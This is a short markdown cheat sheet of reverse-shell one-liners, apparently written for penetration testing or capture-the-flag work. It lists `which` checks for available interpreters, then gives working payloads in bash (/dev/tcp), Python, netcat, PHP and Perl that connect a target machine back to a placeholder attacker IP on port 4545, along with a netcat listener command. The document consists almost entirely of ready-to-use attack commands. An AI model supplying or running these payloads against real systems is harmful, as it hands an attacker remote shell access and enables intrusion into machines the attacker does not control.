#### We will get root priviles from these
#### checking for reverse shell
```bash
when we are in target machine check which are present there to get reverse shell
which bash
which sh
which python
which python3
which perl
which php
which ruby
which nc
which socat
```
#### NOTE
```bash
Replace ip with attacker ip
and port with attacker port which we are listening in attacker machine
```

#### Bash
```bash
attacker machine
  nc -lvp 4545
in target machine
bash reverse shell
bash -i >& /dev/tcp/[ATTACKER-IP]/[PORT] 0>&1
```

#### Python
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4545));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

#### Netcat
```bash
nc -e /bin/sh ATTACKER_IP 4545
```
#### PHP
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4545);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```
